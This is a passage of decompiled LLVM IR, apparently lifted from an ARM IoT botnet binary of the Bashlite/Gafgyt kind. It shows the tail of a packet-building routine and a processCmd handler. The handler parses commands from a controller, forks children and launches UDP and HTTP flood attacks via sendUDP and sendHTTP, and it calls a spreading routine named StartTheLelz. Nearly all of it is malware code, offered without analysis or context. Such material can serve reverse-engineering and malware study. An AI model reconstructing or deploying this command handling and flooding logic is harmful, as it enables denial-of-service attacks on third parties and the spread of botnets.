  store i8 %v1_d410, i8* %v4_d410, align 1
  store i32 %v1_d2f8, i32* %r3.global-to-local, align 4
  %v2_d424 = load i8, i8* %v1_d2fc, align 2
  %v3_d424 = zext i8 %v2_d424 to i32
  store i32 %v3_d424, i32* %r2.global-to-local, align 4
  %v3_d428 = load i8, i8* %v2_d300, align 1
  %v4_d428 = zext i8 %v3_d428 to i32
  %v4_d42c = mul nuw nsw i32 %v4_d428, 256
  %v5_d42c = or i32 %v4_d42c, %v3_d424
  store i32 %v5_d42c, i32* %r3.global-to-local, align 4
  %v3_d438 = call i32 @csum(i8* %v4_d038, i32 %v5_d42c)
  %sext6 = mul i32 %v3_d438, 16777216
  %v1_d43c = sdiv i32 %sext6, 16777216
  store i32 %v1_d43c, i32* %r3.global-to-local, align 4
  store i32 %v3_cfdc, i32* %r2.global-to-local, align 4
  %v1_d444 = trunc i32 %v1_d43c to i8
  store i8 %v1_d444, i8* %v4_d31c, align 2
  %v0_d448 = load i32, i32* %r3.global-to-local, align 4
  %v3_d44831 = udiv i32 %v0_d448, 256
  %v1_d44c = trunc i32 %v3_d44831 to i8
  %v2_d44c = load i32, i32* %r2.global-to-local, align 4
  %v3_d44c = add i32 %v2_d44c, 11
  %v4_d44c = inttoptr i32 %v3_d44c to i8*
  store i8 %v1_d44c, i8* %v4_d44c, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_d458 = icmp eq i32 %stack_var_-88.0, %arg7
  br i1 %v9_d458, label %dec_label_pc_d460, label %dec_label_pc_d484

dec_label_pc_d460:                                ; preds = %dec_label_pc_d34c
  %v2_d464 = call i32 @__GI_time(i32* null)
  store i32 %v2_d464, i32* %r2.global-to-local, align 4
  store i32 %v2_d338, i32* %r3.global-to-local, align 4
  %v8_d474 = icmp sgt i32 %v2_d464, %v2_d338
  br i1 %v8_d474, label %dec_label_pc_d494, label %dec_label_pc_d478

dec_label_pc_d478:                                ; preds = %dec_label_pc_d460
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_d34c

dec_label_pc_d484:                                ; preds = %dec_label_pc_d34c
  %v1_d488 = add i32 %stack_var_-88.0, 1
  store i32 %v1_d488, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d34c

dec_label_pc_d494:                                ; preds = %dec_label_pc_d460, %dec_label_pc_cf40, %dec_label_pc_cf00, %dec_label_pc_cedc
  %v12_d49c = phi i32 [ %v6_cf64, %dec_label_pc_cf40 ], [ 0, %dec_label_pc_cf00 ], [ %v3_ceec, %dec_label_pc_cedc ], [ %v2_d464, %dec_label_pc_d460 ]
  store i32 %v3_ce50, i32* @r4, align 4
  store i32 %v6_ce50, i32* @fp, align 4
  ret i32 %v12_d49c

; uselistorder directives
  uselistorder i32 %v1_d488, { 1, 0 }
  uselistorder i32 %v1_d43c, { 1, 0 }
  uselistorder i32 %v1_d400, { 1, 0 }
  uselistorder i32 %v0_d3c4, { 1, 0 }
  uselistorder i32 %v3_d3ac, { 1, 0 }
  uselistorder i32 %v0_d394, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_d338, { 1, 0, 2 }
  uselistorder i32 %v3_d320, { 1, 0 }
  uselistorder i32 %v1_d314, { 1, 0 }
  uselistorder i32 %v1_d2f8, { 0, 2, 1 }
  uselistorder i32 %v1_d2d8, { 1, 0 }
  uselistorder i32 %v3_d2c4, { 2, 0, 1 }
  uselistorder i8 %v0_d280.sink.off0, { 1, 0 }
  uselistorder i32 %v3_d2a0, { 1, 0 }
  uselistorder i32 %v0_d280, { 1, 0 }
  uselistorder i32 %v0_d234, { 1, 0 }
  uselistorder i32 %v2_d21c, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_d148, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_d0bc, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_d054, { 1, 0 }
  uselistorder i32 %v0_d03c, { 1, 0 }
  uselistorder i32 %v1_cffc, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_cfdc, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_cfac, { 1, 0 }
  uselistorder i32 %v3_cec0, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 11, 12, 8, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23, 27, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 53, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 50, 52, 51, 80, 54, 55, 56, 57, 58, 59, 62, 60, 61, 63, 64, 65, 66, 68, 67, 69, 70, 72, 71, 73, 74, 76, 75, 77, 78, 79, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg4, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_d2b4, { 1, 0 }
  uselistorder label %dec_label_pc_d214, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_d128, { 1, 0 }
  uselistorder label %dec_label_pc_cfa8, { 1, 0 }
  uselistorder label %dec_label_pc_cedc, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_d4c0 = load i32, i32* @r4, align 4
  %v6_d4c0 = load i32, i32* @r5, align 4
  %v9_d4c0 = load i32, i32* @r6, align 4
  %v12_d4c0 = load i32, i32* @r7, align 4
  %v15_d4c0 = load i32, i32* @r8, align 4
  %v18_d4c0 = load i32, i32* @fp, align 4
  store i32 54472, i32* %stack_var_-4, align 4
  %v2_d4c4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_d4c4, i32* @fp, align 4
  %v2_d4d8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19784.218 to i32), i32* @r1, align 4
  %v3_d4e4 = inttoptr i32 %v2_d4d8 to i8*
  %v4_d4e4 = call i32 @__GI_strcoll(i8* %v3_d4e4, i32 ptrtoint ([5 x i8]* @global_var_19784.218 to i32))
  %v2_d4ec = icmp eq i32 %v4_d4e4, 0
  br i1 %v2_d4ec, label %dec_label_pc_e040, label %dec_label_pc_d4f4

dec_label_pc_d4f4:                                ; preds = %entry
  %v2_d4f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_1978c.220 to i32), i32* @r1, align 4
  %v3_d504 = inttoptr i32 %v2_d4f8 to i8*
  %v4_d504 = call i32 @__GI_strcoll(i8* %v3_d504, i32 ptrtoint ([6 x i8]* @global_var_1978c.220 to i32))
  %v2_d50c = icmp eq i32 %v4_d504, 0
  br i1 %v2_d50c, label %dec_label_pc_d514, label %dec_label_pc_d5f4

dec_label_pc_d514:                                ; preds = %dec_label_pc_d4f4
  %v1_d518 = add i32 %tmp, 4
  %v1_d51c = inttoptr i32 %v1_d518 to i32*
  %v2_d51c = load i32, i32* %v1_d51c, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19794.222 to i32), i32* @r1, align 4
  %v3_d528 = inttoptr i32 %v2_d51c to i8*
  %v4_d528 = call i32 @__GI_strcoll(i8* %v3_d528, i32 ptrtoint ([4 x i8]* @global_var_19794.222 to i32))
  %v2_d530 = icmp eq i32 %v4_d528, 0
  br i1 %v2_d530, label %dec_label_pc_d538, label %dec_label_pc_d568

dec_label_pc_d538:                                ; preds = %dec_label_pc_d514
  %v2_d53c = load i32, i32* @global_var_297b4.224, align 4
  %v2_d540 = icmp eq i32 %v2_d53c, 0
  br i1 %v2_d540, label %dec_label_pc_e040, label %dec_label_pc_d548

dec_label_pc_d548:                                ; preds = %dec_label_pc_d538
  %v0_d558 = call i32 @kill()
  store i32 0, i32* @global_var_297b4.224, align 4
  br label %dec_label_pc_d568

dec_label_pc_d568:                                ; preds = %dec_label_pc_d514, %dec_label_pc_d548
  %v2_d570 = load i32, i32* %v1_d51c, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19798.226 to i32), i32* @r1, align 4
  %v3_d57c = inttoptr i32 %v2_d570 to i8*
  %v4_d57c = call i32 @__GI_strcoll(i8* %v3_d57c, i32 ptrtoint ([3 x i8]* @global_var_19798.226 to i32))
  %v2_d584 = icmp eq i32 %v4_d57c, 0
  br i1 %v2_d584, label %dec_label_pc_d58c, label %dec_label_pc_d5f4

dec_label_pc_d58c:                                ; preds = %dec_label_pc_d568
  %v2_d590 = load i32, i32* @global_var_297b4.224, align 4
  %v2_d594 = icmp eq i32 %v2_d590, 0
  br i1 %v2_d594, label %dec_label_pc_d59c, label %dec_label_pc_e040

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d58c
  %v0_d59c = call i32 @__libc_fork()
  %v2_d5bc = icmp eq i32 %v0_d59c, 0
  br i1 %v2_d5bc, label %dec_label_pc_d5e0, label %dec_label_pc_d5c4

dec_label_pc_d5c4:                                ; preds = %dec_label_pc_d59c
  store i32 %v0_d59c, i32* @global_var_297b4.224, align 4
  br label %dec_label_pc_e040

dec_label_pc_d5e0:                                ; preds = %dec_label_pc_d59c
  %v2_d5e8 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_d5f0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d568, %dec_label_pc_d4f4
  %v2_d5f8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1979c.228 to i32), i32* @r1, align 4
  %v3_d604 = inttoptr i32 %v2_d5f8 to i8*
  %v4_d604 = call i32 @__GI_strcoll(i8* %v3_d604, i32 ptrtoint ([5 x i8]* @global_var_1979c.228 to i32))
  %v2_d60c = icmp eq i32 %v4_d604, 0
  br i1 %v2_d60c, label %dec_label_pc_d614, label %dec_label_pc_d788

dec_label_pc_d614:                                ; preds = %dec_label_pc_d5f4
  %v7_d61c = icmp slt i32 %arg1, 6
  br i1 %v7_d61c, label %dec_label_pc_e040, label %dec_label_pc_d620

dec_label_pc_d620:                                ; preds = %dec_label_pc_d614
  %v1_d624 = add i32 %tmp, 12
  %v1_d628 = inttoptr i32 %v1_d624 to i32*
  %v2_d628 = load i32, i32* %v1_d628, align 4
  store i32 %v2_d628, i32* @r0, align 4
  %v1_d630 = call i32 @atol(i32 %v2_d628)
  %tmp88 = icmp slt i32 %v1_d630, 1
  br i1 %tmp88, label %dec_label_pc_e040, label %dec_label_pc_d640

dec_label_pc_d640:                                ; preds = %dec_label_pc_d620
  %v1_d644 = add i32 %tmp, 20
  %v1_d648 = inttoptr i32 %v1_d644 to i32*
  %v2_d648 = load i32, i32* %v1_d648, align 4
  store i32 %v2_d648, i32* @r0, align 4
  %v1_d650 = call i32 @atol(i32 %v2_d648)
  %v5_d65c = icmp sgt i32 %v1_d650, 0
  br i1 %v5_d65c, label %dec_label_pc_d664, label %dec_label_pc_e040

dec_label_pc_d664:                                ; preds = %dec_label_pc_d640
  %v0_d664 = call i32 @listFork()
  %v2_d66c = icmp eq i32 %v0_d664, 0
  br i1 %v2_d66c, label %dec_label_pc_d674, label %dec_label_pc_e040

dec_label_pc_d674:                                ; preds = %dec_label_pc_d664
  %v2_d678 = load i32, i32* @global_var_2352c.49, align 4
  store i32 %v2_d678, i32* @r5, align 4
  %v1_d680 = add i32 %tmp, 4
  %v1_d684 = inttoptr i32 %v1_d680 to i32*
  %v2_d684 = load i32, i32* %v1_d684, align 4
  store i32 %v2_d684, i32* @r6, align 4
  %v1_d68c = add i32 %tmp, 8
  %v1_d690 = inttoptr i32 %v1_d68c to i32*
  %v2_d690 = load i32, i32* %v1_d690, align 4
  store i32 %v2_d690, i32* @r7, align 4
  %v2_d69c = load i32, i32* %v1_d628, align 4
  store i32 %v2_d69c, i32* @r0, align 4
  %v1_d6a4 = call i32 @atol(i32 %v2_d69c)
  store i32 %v1_d6a4, i32* @r4, align 4
  %v2_d6b4 = load i32, i32* %v1_d648, align 4
  store i32 %v2_d6b4, i32* @r0, align 4
  %v1_d6bc = call i32 @atol(i32 %v2_d6b4)
  %v0_d6cc = load i32, i32* @r5, align 4
  %v0_d6d4 = load i32, i32* @r6, align 4
  %v0_d6d8 = load i32, i32* @r7, align 4
  %v7_d6dc = call i32 @Rootsprintf(i32 %v0_d6cc, i32 ptrtoint ([38 x i8]* @global_var_197a4.231 to i32), i32 %v0_d6d4, i32 %v0_d6d8)
  %v2_d6e8 = load i32, i32* %v1_d684, align 4
  store i32 %v2_d6e8, i32* @r5, align 4
  %v2_d6f8 = load i32, i32* %v1_d690, align 4
  store i32 %v2_d6f8, i32* @r6, align 4
  %v2_d708 = load i32, i32* %v1_d628, align 4
  store i32 %v2_d708, i32* @r0, align 4
  %v1_d710 = call i32 @atol(i32 %v2_d708)
  %v3_d71c = urem i32 %v1_d710, 65536
  store i32 %v3_d71c, i32* @r7, align 4
  %v1_d728 = add i32 %tmp, 16
  %v1_d72c = inttoptr i32 %v1_d728 to i32*
  %v2_d72c = load i32, i32* %v1_d72c, align 4
  store i32 %v2_d72c, i32* @r8, align 4
  %v2_d73c = load i32, i32* %v1_d648, align 4
  store i32 %v2_d73c, i32* @r0, align 4
  %v1_d744 = call i32 @atol(i32 %v2_d73c)
  store i32 %v1_d744, i32* @r4, align 4
  %v1_d750 = add i32 %tmp, 24
  %v1_d754 = inttoptr i32 %v1_d750 to i32*
  %v2_d754 = load i32, i32* %v1_d754, align 4
  store i32 %v2_d754, i32* @r0, align 4
  %v1_d75c = call i32 @atol(i32 %v2_d754)
  %v0_d764 = load i32, i32* @r4, align 4
  %v0_d76c = load i32, i32* @r5, align 4
  %v0_d770 = load i32, i32* @r6, align 4
  %v0_d774 = load i32, i32* @r7, align 4
  %v0_d778 = load i32, i32* @r8, align 4
  %v6_d77c = trunc i32 %v0_d774 to i8
  %v7_d77c = call i32 @sendHTTP(i32 %v0_d76c, i32 %v0_d770, i8 %v6_d77c, i32 %v0_d778, i32 %v0_d764, i32 %v1_d75c)
  %v1_d784 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_d788

dec_label_pc_d788:                                ; preds = %dec_label_pc_d5f4, %dec_label_pc_d674
  %v2_d78c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_197cc.233 to i32), i32* @r1, align 4
  %v3_d798 = inttoptr i32 %v2_d78c to i8*
  %v4_d798 = call i32 @__GI_strcoll(i8* %v3_d798, i32 ptrtoint ([4 x i8]* @global_var_197cc.233 to i32))
  %v2_d7a0 = icmp eq i32 %v4_d798, 0
  br i1 %v2_d7a0, label %dec_label_pc_d7a8, label %dec_label_pc_daf4

dec_label_pc_d7a8:                                ; preds = %dec_label_pc_d788
  %v7_d7b0 = icmp slt i32 %arg1, 6
  br i1 %v7_d7b0, label %dec_label_pc_e040, label %dec_label_pc_d7b4

dec_label_pc_d7b4:                                ; preds = %dec_label_pc_d7a8
  %v1_d7b8 = add i32 %tmp, 12
  %v1_d7bc = inttoptr i32 %v1_d7b8 to i32*
  %v2_d7bc = load i32, i32* %v1_d7bc, align 4
  store i32 %v2_d7bc, i32* @r0, align 4
  %v1_d7c4 = call i32 @atol(i32 %v2_d7bc)
  %v7_d7cc = icmp eq i32 %v1_d7c4, -1
  br i1 %v7_d7cc, label %dec_label_pc_e040, label %dec_label_pc_d7d4

dec_label_pc_d7d4:                                ; preds = %dec_label_pc_d7b4
  %v1_d7d8 = add i32 %tmp, 8
  %v1_d7dc = inttoptr i32 %v1_d7d8 to i32*
  %v2_d7dc = load i32, i32* %v1_d7dc, align 4
  store i32 %v2_d7dc, i32* @r0, align 4
  %v1_d7e4 = call i32 @atol(i32 %v2_d7dc)
  %v7_d7ec = icmp eq i32 %v1_d7e4, -1
  br i1 %v7_d7ec, label %dec_label_pc_e040, label %dec_label_pc_d7f4

dec_label_pc_d7f4:                                ; preds = %dec_label_pc_d7d4
  %v1_d7f8 = add i32 %tmp, 16
  %v1_d7fc = inttoptr i32 %v1_d7f8 to i32*
  %v2_d7fc = load i32, i32* %v1_d7fc, align 4
  store i32 %v2_d7fc, i32* @r0, align 4
  %v1_d804 = call i32 @atol(i32 %v2_d7fc)
  %v7_d80c = icmp eq i32 %v1_d804, -1
  br i1 %v7_d80c, label %dec_label_pc_e040, label %dec_label_pc_d814

dec_label_pc_d814:                                ; preds = %dec_label_pc_d7f4
  %v1_d818 = add i32 %tmp, 20
  %v1_d81c = inttoptr i32 %v1_d818 to i32*
  %v2_d81c = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d81c, i32* @r0, align 4
  %v1_d824 = call i32 @atol(i32 %v2_d81c)
  %v7_d82c = icmp eq i32 %v1_d824, -1
  br i1 %v7_d82c, label %dec_label_pc_e040, label %dec_label_pc_d834

dec_label_pc_d834:                                ; preds = %dec_label_pc_d814
  %v2_d83c = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d83c, i32* @r0, align 4
  %v1_d844 = call i32 @atol(i32 %v2_d83c)
  %v8_d850 = icmp sgt i32 %v1_d844, 65536
  br i1 %v8_d850, label %dec_label_pc_e040, label %dec_label_pc_d854

dec_label_pc_d854:                                ; preds = %dec_label_pc_d834
  %v2_d85c = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d85c, i32* @r0, align 4
  %v1_d864 = call i32 @atol(i32 %v2_d85c)
  %v8_d878 = icmp sgt i32 %v1_d864, 65500
  br i1 %v8_d878, label %dec_label_pc_e040, label %dec_label_pc_d87c

dec_label_pc_d87c:                                ; preds = %dec_label_pc_d854
  %v2_d884 = load i32, i32* %v1_d7fc, align 4
  store i32 %v2_d884, i32* @r0, align 4
  %v1_d88c = call i32 @atol(i32 %v2_d884)
  %v8_d898 = icmp sgt i32 %v1_d88c, 32
  br i1 %v8_d898, label %dec_label_pc_e040, label %dec_label_pc_d89c

dec_label_pc_d89c:                                ; preds = %dec_label_pc_d87c
  %v7_d8a0 = icmp eq i32 %arg1, 7
  br i1 %v7_d8a0, label %dec_label_pc_d8a8, label %dec_label_pc_d8cc

dec_label_pc_d8a8:                                ; preds = %dec_label_pc_d89c
  %v1_d8ac = add i32 %tmp, 24
  %v1_d8b0 = inttoptr i32 %v1_d8ac to i32*
  %v2_d8b0 = load i32, i32* %v1_d8b0, align 4
  store i32 %v2_d8b0, i32* @r0, align 4
  %v1_d8b8 = call i32 @atol(i32 %v2_d8b0)
  %v5_d8c4 = icmp sgt i32 %v1_d8b8, 0
  br i1 %v5_d8c4, label %dec_label_pc_d8cc, label %dec_label_pc_e040

dec_label_pc_d8cc:                                ; preds = %dec_label_pc_d89c, %dec_label_pc_d8a8
  %v1_d8d0 = add i32 %tmp, 4
  %v1_d8d4 = inttoptr i32 %v1_d8d0 to i32*
  %v2_d8d4 = load i32, i32* %v1_d8d4, align 4
  %v2_d8e4 = load i32, i32* %v1_d7dc, align 4
  store i32 %v2_d8e4, i32* @r0, align 4
  %v1_d8ec = call i32 @atol(i32 %v2_d8e4)
  %v2_d900 = load i32, i32* %v1_d7bc, align 4
  store i32 %v2_d900, i32* @r0, align 4
  %v1_d908 = call i32 @atol(i32 %v2_d900)
  %v2_d91c = load i32, i32* %v1_d7fc, align 4
  store i32 %v2_d91c, i32* @r0, align 4
  %v1_d924 = call i32 @atol(i32 %v2_d91c)
  %v2_d938 = load i32, i32* %v1_d81c, align 4
  store i32 %v2_d938, i32* @r0, align 4
  %v1_d940 = call i32 @atol(i32 %v2_d938)
  %v7_d954 = icmp slt i32 %arg1, 7
  br i1 %v7_d954, label %dec_label_pc_d974, label %dec_label_pc_d958

dec_label_pc_d958:                                ; preds = %dec_label_pc_d8cc
  %v1_d95c = add i32 %tmp, 24
  %v1_d960 = inttoptr i32 %v1_d95c to i32*
  %v2_d960 = load i32, i32* %v1_d960, align 4
  store i32 %v2_d960, i32* @r0, align 4
  %v1_d968 = call i32 @atol(i32 %v2_d960)
  br label %dec_label_pc_d97c

dec_label_pc_d974:                                ; preds = %dec_label_pc_d8cc
  br label %dec_label_pc_d97c

dec_label_pc_d97c:                                ; preds = %dec_label_pc_d958, %dec_label_pc_d974
  %storemerge8 = phi i32 [ 1000, %dec_label_pc_d974 ], [ %v1_d968, %dec_label_pc_d958 ]
  %v7_d98c = icmp slt i32 %arg1, 8
  br i1 %v7_d98c, label %dec_label_pc_d9ac, label %dec_label_pc_d990

dec_label_pc_d990:                                ; preds = %dec_label_pc_d97c
  %v1_d994 = add i32 %tmp, 28
  %v1_d998 = inttoptr i32 %v1_d994 to i32*
  %v2_d998 = load i32, i32* %v1_d998, align 4
  store i32 %v2_d998, i32* @r0, align 4
  %v1_d9a0 = call i32 @atol(i32 %v2_d998)
  br label %dec_label_pc_d9c0

dec_label_pc_d9ac:                                ; preds = %dec_label_pc_d97c
  br label %dec_label_pc_d9c0

dec_label_pc_d9c0:                                ; preds = %dec_label_pc_d990, %dec_label_pc_d9ac
  %storemerge7 = phi i32 [ 1000000, %dec_label_pc_d9ac ], [ %v1_d9a0, %dec_label_pc_d990 ]
  %v7_d9d0 = icmp slt i32 %arg1, 9
  br i1 %v7_d9d0, label %dec_label_pc_d9f0, label %dec_label_pc_d9d4

dec_label_pc_d9d4:                                ; preds = %dec_label_pc_d9c0
  %v1_d9d8 = add i32 %tmp, 32
  %v1_d9dc = inttoptr i32 %v1_d9d8 to i32*
  %v2_d9dc = load i32, i32* %v1_d9dc, align 4
  store i32 %v2_d9dc, i32* @r0, align 4
  %v1_d9e4 = call i32 @atol(i32 %v2_d9dc)
  br label %dec_label_pc_d9f8

dec_label_pc_d9f0:                                ; preds = %dec_label_pc_d9c0
  br label %dec_label_pc_d9f8

dec_label_pc_d9f8:                                ; preds = %dec_label_pc_d9d4, %dec_label_pc_d9f0
  %storemerge6 = phi i32 [ 0, %dec_label_pc_d9f0 ], [ %v1_d9e4, %dec_label_pc_d9d4 ]
  %v2_da0c = call i32 @__GI_strchr(i32 %v2_d8d4, i32 44)
  %v2_da14 = icmp eq i32 %v2_da0c, 0
  br i1 %v2_da14, label %dec_label_pc_daa8, label %dec_label_pc_da1c

dec_label_pc_da1c:                                ; preds = %dec_label_pc_d9f8
  store i32 %v2_d8d4, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1976c.206 to i32), i32* @r1, align 4
  %v2_da28 = call i32 @__GI_strtok(i32 %v2_d8d4, i32 ptrtoint (i32* @global_var_1976c.206 to i32))
  %v2_da9c21 = icmp eq i32 %v2_da28, 0
  br i1 %v2_da9c21, label %dec_label_pc_e040, label %dec_label_pc_da38

dec_label_pc_da38:                                ; preds = %dec_label_pc_da1c, %dec_label_pc_da84
  %storemerge1522 = phi i32 [ %v2_da8c, %dec_label_pc_da84 ], [ %v2_da28, %dec_label_pc_da1c ]
  %v0_da38 = call i32 @listFork()
  %v2_da40 = icmp eq i32 %v0_da38, 0
  br i1 %v2_da40, label %dec_label_pc_da48, label %dec_label_pc_da84

dec_label_pc_da48:                                ; preds = %dec_label_pc_da38
  %v8_da78 = call i32 @sendUDP(i32 %storemerge1522, i32 %v1_d8ec, i32 %v1_d908, i32 %v1_d924, i32 %v1_d940, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_da80 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_da84:                                ; preds = %dec_label_pc_da38
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1976c.206 to i32), i32* @r1, align 4
  %v2_da8c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1976c.206 to i32))
  %v2_da9c = icmp eq i32 %v2_da8c, 0
  br i1 %v2_da9c, label %dec_label_pc_e040, label %dec_label_pc_da38

dec_label_pc_daa8:                                ; preds = %dec_label_pc_d9f8
  %v0_daa8 = call i32 @listFork()
  %v2_dab0 = icmp eq i32 %v0_daa8, 0
  br i1 %v2_dab0, label %dec_label_pc_dab8, label %dec_label_pc_e040

dec_label_pc_dab8:                                ; preds = %dec_label_pc_daa8
  %v8_dae8 = call i32 @sendUDP(i32 %v2_d8d4, i32 %v1_d8ec, i32 %v1_d908, i32 %v1_d924, i32 %v1_d940, i32 %storemerge8, i32 %storemerge7, i32 %storemerge6)
  %v1_daf0 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_daf4:                                ; preds = %dec_label_pc_d788
  %v2_daf8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_197d0.236 to i32), i32* @r1, align 4
  %v3_db04 = inttoptr i32 %v2_daf8 to i8*
  %v4_db04 = call i32 @__GI_strcoll(i8* %v3_db04, i32 ptrtoint ([4 x i8]* @global_var_197d0.236 to i32))
  %v2_db0c = icmp eq i32 %v4_db04, 0
  br i1 %v2_db0c, label %dec_label_pc_db14, label %dec_label_pc_ddc4

dec_label_pc_db14:                                ; preds = %dec_label_pc_daf4
  %v7_db1c = icmp slt i32 %arg1, 6
  br i1 %v7_db1c, label %dec_label_pc_e040, label %dec_label_pc_db20

dec_label_pc_db20:                                ; preds = %dec_label_pc_db14
  %v1_db24 = add i32 %tmp, 12
  %v1_db28 = inttoptr i32 %v1_db24 to i32*
  %v2_db28 = load i32, i32* %v1_db28, align 4
  store i32 %v2_db28, i32* @r0, align 4
  %v1_db30 = call i32 @atol(i32 %v2_db28)
  %v7_db38 = icmp eq i32 %v1_db30, -1
  br i1 %v7_db38, label %dec_label_pc_e040, label %dec_label_pc_db40

dec_label_pc_db40:                                ; preds = %dec_label_pc_db20
  %v1_db44 = add i32 %tmp, 8
  %v1_db48 = inttoptr i32 %v1_db44 to i32*
  %v2_db48 = load i32, i32* %v1_db48, align 4
  store i32 %v2_db48, i32* @r0, align 4
  %v1_db50 = call i32 @atol(i32 %v2_db48)
  %v7_db58 = icmp eq i32 %v1_db50, -1
  br i1 %v7_db58, label %dec_label_pc_e040, label %dec_label_pc_db60

dec_label_pc_db60:                                ; preds = %dec_label_pc_db40
  %v1_db64 = add i32 %tmp, 16
  %v1_db68 = inttoptr i32 %v1_db64 to i32*
  %v2_db68 = load i32, i32* %v1_db68, align 4
  store i32 %v2_db68, i32* @r0, align 4
  %v1_db70 = call i32 @atol(i32 %v2_db68)
  %v7_db78 = icmp eq i32 %v1_db70, -1
  br i1 %v7_db78, label %dec_label_pc_e040, label %dec_label_pc_db80

dec_label_pc_db80:                                ; preds = %dec_label_pc_db60
  %v2_db88 = load i32, i32* %v1_db68, align 4
  store i32 %v2_db88, i32* @r0, align 4
  %v1_db90 = call i32 @atol(i32 %v2_db88)
  %v8_db9c = icmp sgt i32 %v1_db90, 32
  br i1 %v8_db9c, label %dec_label_pc_e040, label %dec_label_pc_dba0

dec_label_pc_dba0:                                ; preds = %dec_label_pc_db80
  %v7_dba8 = icmp slt i32 %arg1, 7
  br i1 %v7_dba8, label %dec_label_pc_dbcc, label %dec_label_pc_dbac

dec_label_pc_dbac:                                ; preds = %dec_label_pc_dba0
  %v1_dbb0 = add i32 %tmp, 24
  %v1_dbb4 = inttoptr i32 %v1_dbb0 to i32*
  %v2_dbb4 = load i32, i32* %v1_dbb4, align 4
  store i32 %v2_dbb4, i32* @r0, align 4
  %v1_dbbc = call i32 @atol(i32 %v2_dbb4)
  %v1_dbc4 = icmp slt i32 %v1_dbbc, 0
  br i1 %v1_dbc4, label %dec_label_pc_e040, label %dec_label_pc_dbcc

dec_label_pc_dbcc:                                ; preds = %dec_label_pc_dbac, %dec_label_pc_dba0
  %v7_dbd0 = icmp eq i32 %arg1, 8
  br i1 %v7_dbd0, label %dec_label_pc_dbd8, label %dec_label_pc_dbfc

dec_label_pc_dbd8:                                ; preds = %dec_label_pc_dbcc
  %v1_dbdc = add i32 %tmp, 28
  %v1_dbe0 = inttoptr i32 %v1_dbdc to i32*
  %v2_dbe0 = load i32, i32* %v1_dbe0, align 4
  store i32 %v2_dbe0, i32* @r0, align 4
  %v1_dbe8 = call i32 @atol(i32 %v2_dbe0)
  %v5_dbf4 = icmp sgt i32 %v1_dbe8, 0
  br i1 %v5_dbf4, label %dec_label_pc_dbfc, label %dec_label_pc_e040

dec_label_pc_dbfc:                                ; preds = %dec_label_pc_dbcc, %dec_label_pc_dbd8
  %v1_dc00 = add i32 %tmp, 4
  %v1_dc04 = inttoptr i32 %v1_dc00 to i32*
